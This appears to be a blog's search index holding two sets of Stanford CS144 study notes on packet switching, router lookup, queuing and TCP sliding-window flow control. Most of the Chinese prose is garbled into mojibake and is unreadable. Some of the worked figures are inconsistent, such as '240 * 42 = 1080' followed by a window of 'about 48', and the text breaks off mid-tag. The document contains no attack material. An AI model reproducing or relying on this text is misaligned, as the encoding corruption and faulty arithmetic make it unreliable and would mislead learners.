<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Network-CS144 ã® 3 Packet Switching</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆ†ç»„äº¤æ¢">åˆ†ç»„äº¤æ¢</h2><p>ç‰¹ç‚¹ï¼š</p><ul><li>Packetsè¢«ç‹¬ç«‹åœ°è·¯ç”±ï¼Œé€šè¿‡æŸ¥æ‰¾å½“å‰è·¯ç”±çš„å±€éƒ¨è·¯ç”±è¡¨</li><li>æ‰€æœ‰çš„Packetså…±äº«ä¸€ä¸ªå®Œæ•´çš„Link</li><li>è·¯ç”±ä¸éœ€è¦ç»´æŠ¤é€šä¿¡çŠ¶æ€</li><li>è·¯ç”±æ˜¯æœ‰ç¼“å­˜çš„<ul><li>ç¼“å­˜åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ä¼šå­˜åœ¨Packetsï¼š<ul><li>When two or more packets arrive at the same time</li><li>During periods of congestion</li></ul></li></ul></li></ul><h2 id="curcuit-switching">Curcuit switching</h2><p>å»ºè®®äº†è§£ä¸‹é€šä¿¡å†å²</p><p>å»ºè®®äº†è§£ä¸‹ç½‘ç»œå†å²</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>Each call has its own private, guaranteed, isolated data rate fromend-to-end</li><li>A call has three phases:<ul><li>Establish circuit form end-to-end</li><li>Communicate</li><li>Close circuit</li></ul></li><li>Originally, a circuit was end-to0end physical wire</li><li>Nowdays, a circuit is like a virtual private wire</li></ul><p>èƒ½å¦åœ¨è®¡ç®—æœºé€šä¿¡ä½¿ç”¨Curcuit switching</p><ul><li>Inefficient:è®¡ç®—æœºé€šä¿¡æ˜¯çˆ†ç‚¸å¼çš„ï¼Œé€šä¿¡éœ€è¦æ¯”è¾ƒé«˜çš„é€Ÿåº¦ï¼Œä¸ç„¶å½±å“ä½“éªŒ</li><li>Diverse Rates: è®¡ç®—æœºé€šä¿¡åœ¨ä¸åŒæƒ…å†µä¸‹é€Ÿåº¦æ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚ a web serverstreaming video at 6Mb/s, typing at a. Character per second. A fixedrate circuit will not be much use.</li><li>State management. Curcuit switch maintain per-communication state,which must be managed.</li></ul><blockquote><p>Efficient use of expensive links</p><ul><li>Links were assumed to be expensive and scarce</li><li>Packet switching allows many, bursty flows to shae the same linkefficiently</li><li>Circuit switching is rarely used for data networks, ... because ofvery inefficient use of the links</li></ul><p>(PS:å…¶å®å°±æ˜¯è¯´åˆ†ç»„äº¤æ¢å…è®¸å…±äº«é“¾æ¥ï¼Œè€Œç”µæŠ¥äº¤æ¢æ¯æ¬¡é“¾æ¥éƒ½æ˜¯ä¸€ä¸ªæ–°çš„é“¾è·¯ï¼Œé‡æ–°æ„å»ºä¸€ä¸ªLinkä»£ä»·æ˜¯æ¯”è¾ƒå¤§çš„)</p><p>Resilience to failure of links &amp; routerss</p><ul><li>For high reliability, [the internet] was to be a datagram subnet, soif some lines and [routers] were destroyed, messages could be ...rerouted</li></ul><p>(PS: åˆ†ç»„äº¤æ¢å³ä½¿ä¸­é—´è·¯ç”±æŸåäº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å…¶ä»–è·¯ç”±é‡æ–°è·¯ç”±)</p></blockquote><p>æ’é˜Ÿæœºåˆ¶æ˜¯ATMäº¤æ¢ä¸­ä¸€ä¸ªæä¸ºé‡è¦çš„å†…å®¹ï¼Œé˜Ÿåˆ—çš„æº¢å‡ºä¼šå¼•èµ·ä¿¡å…ƒä¸¢å¤±ï¼Œä¿¡å…ƒæ’é˜Ÿæ˜¯äº¤æ¢æ—¶å»¶å’Œæ—¶å»¶æŠ–åŠ¨çš„ä¸»è¦åŸå› ï¼Œå› æ­¤æ’é˜Ÿæœºåˆ¶å¯¹ATMäº¤æ¢æœºæ€§èƒ½æœ‰ç€å†³å®šæ€§çš„å½±å“ã€‚åŸºæœ¬æ’é˜Ÿæœºåˆ¶æœ‰ä¸‰ç§ï¼šè¾“å…¥æ’é˜Ÿã€è¾“å‡ºæ’é˜Ÿå’Œä¸­å¤®æ’é˜Ÿã€‚è¿™ä¸‰ç§æ–¹å¼å„æœ‰ç¼ºç‚¹ï¼Œå¦‚è¾“å…¥æ’é˜Ÿæœ‰ä¿¡å¤´é˜»å¡ï¼Œäº¤æ¢æœºçš„è´Ÿè·è¾¾ä¸åˆ°60%ï¼›è¾“å‡ºæ’é˜Ÿå­˜å‚¨å™¨åˆ©ç”¨ç‡ä½ï¼Œå¹³å‡é˜Ÿé•¿è¦æ±‚é•¿ï¼Œè€Œä¸­å¤®æ’é˜Ÿå­˜å‚¨å™¨é€Ÿç‡è¦æ±‚é«˜ã€å­˜å‚¨å™¨ç®¡ç†å¤æ‚ã€‚åŒæ—¶ï¼Œä¸‰ç§æ–¹å¼æœ‰å„æœ‰ä¼˜ç‚¹ï¼Œè¾“å…¥é˜Ÿåˆ—å¯¹å­˜å‚¨å™¨é€Ÿç‡è¦æ±‚ä½ï¼Œä¸­å¤®æ’é˜Ÿæ•ˆç‡é«˜ï¼Œè¾“å‡ºé˜Ÿåˆ—åˆ™å¤„äºä¸¤è€…ä¹‹é—´ï¼Œæ‰€ä»¥åœ¨å®é™…åº”ç”¨ä¸­å¹¶æ²¡æœ‰ç›´æ¥åˆ©ç”¨è¿™ä¸‰ç§æ–¹å¼ï¼Œè€Œæ˜¯åŠ ä»¥ç»¼åˆï¼Œé‡‡å–äº†ä¸€äº›æ”¹è¿›çš„æªæ–½ã€‚</p><h2 id="åˆ†åŒ…äº¤æ¢">åˆ†åŒ…äº¤æ¢</h2><h3 id="what-does-a-packet-switch-look-like">what does a packet switchlook like ?</h3><h3 id="what-does-a-packet-switch-do">what does a packet switch do?</h3><ul><li>ä»¥å¤ªç½‘äº¤æ¢æœº(Ethernet switch)</li><li>å› ç‰¹ç½‘è·¯ç”±å™¨(Internet router)</li></ul><h3 id="how-address-lookup-works">How address lookup works</h3><ul><li>ä»¥å¤ªç½‘äº¤æ¢æœº(Ethernet switch)</li><li>å› ç‰¹ç½‘è·¯ç”±å™¨(Internet router)</li></ul><p>ä»¥å¤ªç½‘äº¤æ¢æœºï¼š</p><figure><img src="https://img1.sdnlab.com/%20/wp-content/uploads/2020/11111.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617171950912.png"alt="image-20230617171950912" /><figcaption aria-hidden="true">image-20230617171950912</figcaption></figure><p><strong>Ethernet switch</strong></p><ul><li>Examine the header of each arrving frame</li><li>If the Ethernet DA(Destniation addrdress) is in the forwardingtable, forward the frame to correct output port(s)</li><li>If the Ethernet DA is not in the table, boradcast the frame to allposts</li><li>Entries in the table are learned by examining the Ethernet ofarriving packets.</li></ul><p>Internet Router</p><ul><li><p>If the Ethernet DA of the arriving frame belongs to the router,accept the frame. Else drop it</p></li><li><p>Examine the IP version number and length of the datagram</p></li><li><p>Decrement the TTL, update the IP header checksum.</p></li><li><p>Check to see if TTL == 0</p></li><li><p>if the IP DA is in the forwarding table, forward to the correctegress port(s) for the next hop</p></li><li><p>Find the Ethernet DA for the next hop router</p></li><li><p>Create a new Ethernet frame an d send it</p></li><li><p>Lookup address: How is the address looked up into forwardingtable ?</p></li><li><p>Switching: How is the packet sent to the correct output port?</p></li></ul><p>Lookup address: Ethernet</p><ul><li><p>Methods:</p><ul><li>Store address in hash table (maybe 2-way hash)</li><li>Look for exact match in hash table</li></ul></li></ul><p>Lookup address: IP</p><p>Lookup is a longest prefix match, not an exact match</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172810926.png"alt="image-20230617172810926" /><figcaption aria-hidden="true">image-20230617172810926</figcaption></figure><p>Method 1:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172841236.png"alt="image-20230617172841236" /><figcaption aria-hidden="true">image-20230617172841236</figcaption></figure><p>Method 2:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172919259.png"alt="image-20230617172919259" /><figcaption aria-hidden="true">image-20230617172919259</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172935778.png"alt="image-20230617172935778" /><figcaption aria-hidden="true">image-20230617172935778</figcaption></figure><p>switching packetd to the egress port:</p><ul><li>Output queuing and shared memory</li><li>Inout queuing and head-of-line blocking</li><li>Virtual output queues</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175054605.png"alt="image-20230617175054605" /><figcaption aria-hidden="true">image-20230617175054605</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175119541.png"alt="image-20230617175119541" /><figcaption aria-hidden="true">image-20230617175119541</figcaption></figure><p>ä½†æ˜¯å­˜åœ¨çº¿å¤´é˜»å¡ï¼ˆHead of lineblockingï¼‰ï¼Œç”±äºå…¶å½±å“ï¼Œé€Ÿç‡ä¸‹é™äº†ï¼Œå› ä¸ºåŒä¸€æ—¶åˆ»ï¼Œinputqueueå†…æœ€å‰é¢çš„æŒ¡ä½äº†åé¢æ’é˜Ÿçš„ï¼š</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175353059.png"alt="image-20230617175353059" /><figcaption aria-hidden="true">image-20230617175353059</figcaption></figure><p>è§£å†³æ–¹æ³•ï¼šVirtual Output Queue</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175420698.png"alt="image-20230617175420698" /><figcaption aria-hidden="true">image-20230617175420698</figcaption></figure><p>The simplest and slowesr switches uses output queuing, whichminimizes packet delay.</p><p>High performance switches often use iput queuing, with virtual outputqueues to maximize throughput.</p><p>lab 0:</p><p>ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„TCPå’Œæµå¼socketæŠ½è±¡ï¼ŒåŸºäºInternetå†™ä¸€ä¸ªfetch webpageçš„ç¨‹åºï¼š</p><ul><li>ä½¿ç”¨IDEæ‰“å¼€../apps/webget.cc</li><li>åœ¨ge tURlå‡½æ•°é‡Œå®ç°ä½ çš„ä»£ç </li><li>å°±åƒè¯¥æ–‡ä»¶é‡Œæè¿°çš„é‚£æ ·ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„webå®¢æˆ·ç«¯ï¼ˆä½¿ç”¨httpåè®®ï¼‰ï¼ˆæ³¨ï¼šä½¿ç”¨<code>TCPSocket</code>and <code>address</code> è¿™ä¸¤ä¸ªç±»ï¼‰</li></ul><p>æç¤ºï¼š</p><ul><li>Please note that in HTTP, each line must be ended with â€œâ€ (itâ€™s notsufficient to use just â€œâ€ or endl).</li><li>Donâ€™t forget to include the â€œConnection: closeâ€ line in yourclientâ€™s request. This tells the server that it shouldnâ€™t wait aroundfor your client to send any more requests after this one. Instead, theserver will send one reply and then will immediately end its outgoingbytestream (the one from the serverâ€™s socket to your socket). Youâ€™lldiscover that your incoming byte stream has ended because your socketwill reach â€œEOFâ€ (end of file) when you have read the entire byte streamcoming from the server. Thatâ€™s how your client will know that the serverhas finished its reply.</li><li>Make sure to read and print all the output from the server until thesocket reaches â€œEOFâ€ (end of file)â€”<strong>a single call to read is notenough.</strong>ç¡®ä¿è¯»å–å’Œæ‰“å°æ‰€æœ‰æ¥è‡ªæœåŠ¡å™¨çš„è¾“å‡ºï¼ŒçŸ¥é“socketè¾¾åˆ°äº†EOFï¼ˆæ–‡ä»¶æœ«å°¾ï¼‰</li><li>å¸Œæœ›ä½ åªç”¨9è¡Œä»£ç </li></ul><p>æ­£å¦‚ä¸Šé¢çš„<code>TCPSocket</code>ç±»åœ¨ç½‘ç»œé€šä¿¡ä¸­æ˜¯éå¸¸é‡è¦çš„ï¼Œeventhough the Internet itself only provides the service of â€œbest-effortâ€(unreliable) datagrams.</p><p>ä¸‹é¢å°†å®ç°ä¸€ä¸ªå­—èŠ‚æµï¼Œå·²ç»æä¾›äº†ç›¸å…³çš„æŠ½è±¡ã€‚</p><p>å­—èŠ‚sä»inputä¾§å†™å…¥ï¼Œå¹¶ä»¥ç›¸åŒé¡ºåºä»outputä¾§è¯»å–ï¼Œå­—èŠ‚æµæ˜¯æœ‰é™çš„writerå¯ä»¥endthe input, è¡¨ç¤ºæ²¡æœ‰æ›´å¤šå­—èŠ‚å†™å…¥äº†ã€‚readerä¸€ç›´è¯»ï¼Œç›´åˆ°é‡åˆ°äº†EOFã€‚</p>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç½‘ç»œï¼Œè®¡ç®—æœºåŸºç¡€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 ã® 2 TCP Model</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="tcpæ¨¡å‹">TCPæ¨¡å‹</h2><table><thead><tr class="header"><th>æ€§è´¨</th><th>è¡Œä¸º</th></tr></thead><tbody><tr class="odd"><td>å­—èŠ‚æµ</td><td>å¯é çš„å­—èŠ‚ä¼ è¾“æœåŠ¡</td></tr><tr class="even"><td>å¯é ä¼ è¾“</td><td>ç¡®è®¤æœºåˆ¶ä¿è¯äº†æ­£ç¡®æœ‰åºçš„ä¼ è¾“ï¼›checksumæ£€æµ‹é”™è¯¯æ•°æ®ï¼Œåºåˆ—å·æ£€æµ‹ä¸¢å¤±æ•°æ®ï¼Œæ»‘åŠ¨çª—å£å¼æµé‡æ§åˆ¶è®©å€¼æ¥æ”¶æ–¹è¿‡è½½ï¼›è¶…æ—¶å’Œé‡ä¼ æœºåˆ¶</td></tr><tr class="odd"><td>æœ‰åº</td><td>æœ‰åºåŒæ­¥ä¼ è¾“ï¼ˆåºåˆ—å·å’Œç¡®è®¤å·æœºåˆ¶ï¼‰</td></tr><tr class="even"><td>ç”¨å¡æ§åˆ¶</td><td></td></tr></tbody></table><p>TCPè¿æ¥çš„å”¯ä¸€ID</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[TCP Data src<span class="hljs-built_in"> port </span>, dest port][Ipv4 header,<span class="hljs-built_in"> IP </span>src addr,<span class="hljs-built_in"> IP </span>dest addr, protocol ID = <span class="hljs-string">&#x27;TCP&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬ç”±src port , dest port][Ipv4 header, IP src addr, IP dest addr,protocol ID = 'TCP'ç»„æˆå”¯ä¸€ID</p><p>Host A increments src port for every new connection</p><p>TCP picks ISN(initial seq number) to avoid overlap with previousconnections with same ID(é˜²æ­¢å’Œä¸Šä¸€ä¸ªTCPè¿æ¥çš„æ•°æ®æ··æ·†)</p><h2 id="section"></h2><p>TCPå¦‚ä½•å¯é ï¼Ÿ</p><p>åœæ­¢ä¸ç­‰å¾…/æ»‘åŠ¨çª—å£</p><h2 id="ç«¯åˆ°ç«¯åŸåˆ™">ç«¯åˆ°ç«¯åŸåˆ™</h2><p>ä¸ºä»€ä¹ˆNetworkä¸åšæ›´å¤šçš„äº‹æƒ…ï¼š</p><ul><li>å‹ç¼©æ•°æ®</li><li>reformat/imporove requests</li><li>Serve cached data</li><li>add security</li><li>Migrate connections across the network</li><li>or one of any of a huge number of other things</li></ul><p>Networkä»…ä»…è´Ÿè´£ä¼ è¾“çš„äº‹æƒ…ï¼Œä¸è´Ÿè´£å…¶ä»–çš„ï¼Œå¦‚å­˜å‚¨ï¼Œå¦‚æœåƒä¸Šé¢æ‰€è¯´ï¼ŒæŠŠå¾ˆå¤šä¸œè¥¿éƒ½äº¤ç»™äº†networkæ¥åšï¼Œå®é™…ä¸Šå¾ˆå¤šåšä¸åˆ°ï¼Œæˆ–è€…è¯´æœ‰ç¼ºé™·ï¼Œæ‰€ä»¥å®é™…å®ç°ä¸­ï¼Œç½‘ç»œçš„è®¾è®¡åº”è¯¥æ»¡è¶³ç«¯åˆ°ç«¯åŸåˆ™ï¼Œåªè´Ÿè´£ä¸¤è¾¹çš„ä¼ è¾“ç›¸å…³åŠŸèƒ½</p><h2 id="finite-state-machine">Finite State Machine</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">state1 =&gt;([event causing <span class="hljs-keyword">state</span> transition | actions taken <span class="hljs-keyword">on</span> <span class="hljs-keyword">state</span> transition]) state2<br><br>state1 =&gt;[event | action] state3<br></code></pre></td></tr></table></figure><h2 id="flow-control">flow control</h2><p>flow control 1ï¼šè¦è§£å†³çš„é—®é¢˜æ˜¯å‘é€æ–¹å’Œæ¥æ”¶æ–¹é€Ÿåº¦å·®å¼‚ä¸ä¸€è‡´é—®é¢˜</p><ul><li>Stop and wait</li></ul><p>sender: 500, 000 packets/second</p><p>receiver: 200, 000</p><p>å¦‚æœå…¨é€Ÿå‘é€ï¼Œå°†ä¼šä¸¢åŒ…40%</p><p>æµé‡æ§åˆ¶ï¼šä¸è¦å‘é€è¶…è¿‡æ¥æ”¶æ–¹å¯ä»¥å¤„ç†çš„æ•°æ®åŒ…</p><p>ideaï¼šæ¥æ”¶æ–¹å¯ä»¥å‘é€åé¦ˆï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼</p><ul><li>åœæ­¢ç­‰å¾… (å…¶å®æ˜¯window size = 1çš„æ»‘åŠ¨çª—å£)</li><li>æ»‘åŠ¨çª—å£</li></ul><p>åœæ­¢ç­‰å¾…ï¼š</p><ul><li>ä»»æ„æ—¶é—´é“¾è·¯ä¸­æœ€å¤šä»…æœ‰ä¸€ä¸ªpacket</li><li>å‘é€è€…æ¯æ¬¡å‘é€ä¸€ä¸ª</li><li>æ¥æ”¶æ–¹æ”¶åˆ°åè¿”å›å“åº”</li><li>å½“æ¥æ”¶æ–¹æ”¶åˆ°å“åº”ï¼Œå†æ¬¡å‘é€æ–°çš„packet</li><li>ä¸€æ—¦è¶…æ—¶ï¼Œé‡æ–°å‘é€å½“å‰æ•°æ®</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121206723.png"alt="image-20230611121206723" /><figcaption aria-hidden="true">image-20230611121206723</figcaption></figure><p>ç®€å•åœæ­¢ç­‰å¾…çš„ğŸŒ°ï¼š</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121246484.png"alt="image-20230611121246484" /><figcaption aria-hidden="true">image-20230611121246484</figcaption></figure><p>case 1: æ²¡æœ‰ä¿¡æ¯ä¸¢å¤±</p><p>case 2: req ä¸¢å¤±ï¼Œtimeout é‡æ–°å‘é€</p><p>case 3: response ä¸¢å¤±ï¼Œ timeout é‡æ–°å‘é€</p><p>case 4: å‰é¢ä¸€ä¸ªä¸¢å¤±çš„æ•°æ®æŠ¥ä»…ä»…æ˜¯delayäº†ï¼Œè¿™æ ·å°±ä¼šæœ‰é‡å¤</p><p><strong>solution:</strong> Use 1-bit counter in data andacknowledgements</p><p>â€‹ Receiver can tell if new data or duplicated</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121527344.png"alt="image-20230611121527344" /><figcaption aria-hidden="true">image-20230611121527344</figcaption></figure><p>è¿™æ ·é—´éš”çš„æ•°æ®æŠ¥counterä½æ˜¯ä¸ä¸€æ ·çš„</p><p>1bitåŸºäºä¸¤ä¸ªå‡è®¾ï¼š</p><ul><li>å»¶è¿Ÿä¸ä¼šè¶…è¿‡å¤šä¸ªtimeoutï¼Œè¿™æ ·é—´éš”çš„æ•°æ®counterä½æ˜¯ä¸€æ ·çš„</li><li>ç½‘ç»œæœ¬èº«å¹¶å¤åˆ¶packetï¼Œå› ä¸ºå¦‚æœå‘é€é‡å¤packetï¼Œé‚£ä¹ˆå‰åä¸¤ä¸ªpacketæœ¬èº«æ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯ç”±äºè®¡æ•°å´æ˜¯ä¸ä¸€è‡´çš„ï¼Œè¿™æ ·ä¸¤ä¸ªpacketå°±ä¼šåŒæ—¶å­˜åœ¨</li></ul><h2 id="æ»‘åŠ¨çª—å£">æ»‘åŠ¨çª—å£</h2><p>è€ƒè™‘ä¸€ä¸ªå‘é€æ•°æ®åŒ…çš„ğŸŒ°ï¼š</p><p>ä¸Šæµ· =&gt; åŒ—äº¬</p><p>ç½‘ç»œæ€§èƒ½ä¸Šé™æ˜¯ 10Mb/s</p><p>RTT = 50ms</p><p>Ethnetçš„ä¼ è¾“é€Ÿåº¦æ˜¯12kb/s</p><p>è¿™æ ·1så¯ä»¥å‘é€20æ¬¡ï¼Œæ€»å…±å¯ä»¥å‘20 * 12 = 240kb/s</p><p>240kb/s/10Mb/s = 240/10, 000 = 2.4%</p><p>å‡å¦‚ä½¿ç”¨æ»‘åŠ¨çª—å£ï¼ˆè¿™é‡Œè€ƒè™‘å‘é€æ–¹å’Œæ¥æ”¶æ–¹çª—å£å¤§å°ä¸€è‡´ï¼‰ï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¯ä»¥è¾¾åˆ°æ–°èƒ½ç“¶é¢ˆçš„windowsize</p><p>240 * 42 = 1080ï¼Œå¤§çº¦48ä¸ªwindow sizeå³å¯å……åˆ†ä½¿ç”¨æ•´ä¸ªç½‘ç»œå¸¦å®½</p><p>æ»‘åŠ¨çª—å£ï¼š</p><ul><li>Gerneration of stop-and-wait: allow multiple un-packed segments</li><li>Bound on number of un-packed segments, called window</li><li>Can keep pipe full (å……åˆ†ä½¿ç”¨æ•´ä¸ªç½‘ç»œå¸¦å®½)</li></ul><p>Sliding window Sender</p><ul><li>çª—å£å†…çš„æ¯ä¸ªsegmentéƒ½æœ‰ä¸€ä¸ªåºåˆ—å·</li><li>å‘é€æ–¹ç»´æŠ¤ä¸‰ä¸ªå˜é‡<ul><li>send window size(sws)</li><li>Last acknowledgment received (LAR)</li><li>Last segment sent(LSS)</li></ul></li><li>Maintain invariant: (LSS - LAR) &lt;= SWS</li><li>ç¼“å­˜çª—å£å†…çš„segments</li><li>å½“æœ‰æ–°çš„ç¡®è®¤åˆ°æ¥ï¼Œæ‰©å¼ çª—å£</li></ul><p>Sliding window Receiver</p><ul><li>ç»´æŠ¤ä¸‰ä¸ªå˜é‡<ul><li>Receive window size(sws)</li><li>Last acceptable segment (LAS)</li><li>Last segment received(LSR)</li></ul></li><li>Maintain invariant: (LAS - LSR) &lt;= RWS</li><li>å¦‚æœæ¥å—çš„Packetå°äºLASï¼Œå›å¤ç¡®è®¤</li><li>ç´¯è®¡ç¡®è®¤ï¼šå¦‚æœæ”¶åˆ°äº†1,2,3,5ï¼Œåˆ™å›å¤ack = 3</li></ul><p>æ¯”å¦‚ï¼šRWS=5, LSR = 3, é‚£ä¹ˆæœ¬æ¬¡å°†ä¼šæ¥æ”¶4 ,5 ,6, 7, 8,å¦‚æœæœ‰10ï¼Œæ˜¯ä¸ä¼šæ¥æ”¶çš„</p><p>RWS, SWS and Seq Space</p><ul><li>RWS &gt;= 1, SWS &gt;= 1, RWS &lt;= SWS</li><li>if RWS = 1, go back N protocol, need SWS + 1 seq numbers</li><li>if RWS = SWS, need 2SWS seq numbers</li><li>Generally need RWS + SWS seq numbers</li></ul><p>TCPæµé‡æ§åˆ¶ï¼š</p><ul><li>æ¥æ”¶æ–¹ advertises RWS using window field</li><li>Sender can only send data up to LAR + window</li></ul><p>ç´¯è®¡ç¡®è®¤ï¼šç´¯ç§¯ç¡®è®¤è¿™ä¸ªæ¦‚å¿µåº”è¯¥ä¸åªé€‚ç”¨äºTCPåè®®ï¼Œä¹Ÿé€‚ç”¨å…¶ä»–å±‚ï¼Œæ¯”å¦‚é“¾è·¯å±‚ã€‚</p><p>ä¸€èˆ¬åœ°è®²ï¼Œå¦‚æœå‘é€æ–¹å‘äº†åŒ…1ï¼ŒåŒ…2ï¼ŒåŒ…3ï¼ŒåŒ…4ï¼›æ¥å—æ–¹æˆåŠŸæ”¶åˆ°åŒ…1ï¼ŒåŒ…2ï¼ŒåŒ…3ã€‚é‚£ä¹ˆæ¥å—æ–¹å¯ä»¥å‘å›ä¸€ä¸ªç¡®è®¤åŒ…ï¼Œåºå·ä¸º4(4è¡¨ç¤ºæœŸæœ›ä¸‹ä¸€ä¸ªæ”¶åˆ°çš„åŒ…çš„åºå·ï¼›å½“ç„¶ä½ çº¦å®šå¥½ç”¨3è¡¨ç¤ºä¹Ÿå¯ä»¥)ï¼Œé‚£ä¹ˆå‘é€æ–¹å°±çŸ¥é“åŒ…1åˆ°åŒ…3éƒ½å‘é€æ¥æ”¶æˆåŠŸï¼Œå¿…è¦æ—¶é‡å‘åŒ…4ã€‚ä¸€ä¸ªç¡®è®¤åŒ…ç¡®è®¤äº†ç´¯ç§¯åˆ°æŸä¸€åºå·çš„æ‰€æœ‰åŒ…ï¼Œè€Œä¸æ˜¯å¯¹æ¯ä¸ªåºå·éƒ½å‘ç¡®è®¤åŒ…ã€‚</p><p>å…·ä½“åˆ°TCPï¼Œå®ƒå¯¹å­—èŠ‚ç¼–å·ã€‚æ¯”å¦‚å‘é€æ–¹å‘äº†åŒ…1ï¼ŒåŒ…2ï¼ŒåŒ…3ï¼›åŒ…1å«å­—èŠ‚0åˆ°10ï¼ŒåŒ…2å«å­—èŠ‚11åˆ°20ï¼ŒåŒ…3å«å­—èŠ‚21åˆ°30ã€‚æ¥å—æ–¹æˆåŠŸæ”¶åˆ°åŒ…1ï¼ŒåŒ…2ã€‚é‚£ä¹ˆæ¥å—æ–¹å‘å›ä¸€ä¸ªåŒ…å«ç¡®è®¤åºå·21çš„åŒ…ï¼Œå‘é€æ–¹å°±çŸ¥é“å­—èŠ‚0åˆ°20(åŒ…1ï¼ŒåŒ…2)éƒ½æˆåŠŸæ”¶åˆ°ï¼Œå¿…è¦æ—¶è¦é‡å‘çš„åªéœ€ä»å­—èŠ‚21å¼€å§‹ã€‚</p><h2 id="é‡ä¼ ç­–ç•¥">é‡ä¼ ç­–ç•¥</h2><p>ç°åœ¨å·²ç»æœ‰äº†window sizeçš„æ¦‚å¿µï¼Œç´¯è®¡ç¡®è®¤çš„æ¦‚å¿µï¼Œæ¯ä¸ªPacketéƒ½æœ‰è‡ªå·±çš„å®šæ—¶å™¨</p><p>å¦‚æœå®šæ—¶å™¨è¶…æ—¶æ€ä¹ˆåŠï¼Ÿ</p><ul><li>Go-back-N:ä¸€æ—¦ä¸€ä¸ªåŒ…ä¸¢å¤±äº†å°†ä¼šé‡å‘æ•´ä¸ªçª—å£æ•°æ®ï¼Œæœ¬è´¨ä¸Šæ˜¯å› ä¸ºæ¥æ”¶æ–¹çš„çª—å£å¤§å°ä»…ä»…ä¸º1</li><li>é€‰æ‹©é‡ä¼ ï¼šä¸€æ—¦ä¸€ä¸ªåŒ…ä¸¢å¤±äº†åªä¼šé‡å‘æ•´ä¸ªçª—å£æ•°æ®ä¸¢å¤±çš„é‚£ä¸ªåŒ…</li></ul><p>https://blog.csdn.net/qq_44807642/article/details/103054914https://zhuanlan.zhihu.com/p/589068775https://blog.csdn.net/u011617742/article/details/50387670#:~:text=%E5%9C%A8%E8%BF%94%E5%9B%9EN%E5%8D%8F%E8%AE%AE%E4%B8%AD%EF%BC%8C%E5%8F%91%E9%80%81%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%BF%85%E9%A1%BB%3C%3D2m-1%2C%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%A7%8B%E7%BB%88%E4%B8%BA1%E3%80%82,%E6%9C%AC%E8%B4%A8%E5%B0%B1%E6%98%AF%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%83%BD%20%E8%B6%85%E8%BF%87%E5%BA%8F%E5%8F%B7%E8%83%BD%E8%A1%A8%E7%A4%BA%E7%9A%84%E8%8C%83%E5%9B%B4%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E6%98%AF3%EF%BC%8C%E7%AA%97%E5%8F%A3%E6%98%AF6%E7%AA%97%E5%8F%A3%E6%AF%94%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E5%A4%A7%EF%BC%8C%E4%BC%9A%E5%87%BA%E7%8E%B00%EF%BC%8C1%EF%BC%8C2%2C3%2C0%2C1%E8%BF%99%E6%A0%B7%E7%9A%84%E7%AA%97%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%97%A0%E6%B3%95%E5%88%A4%E6%96%AD%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E8%BF%94%E5%9B%9E%E7%9A%84ACK0%E6%98%AF%E4%BB%A3%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%B8%AA0%E6%94%B6%E5%88%B0%E8%BF%98%E6%98%AF%E7%AC%AC%E4%BA%8C%E4%B8%AA0%E6%94%B6%E5%88%B0%E3%80%82</p><h2 id="tcp-header">TCP header</h2><h2 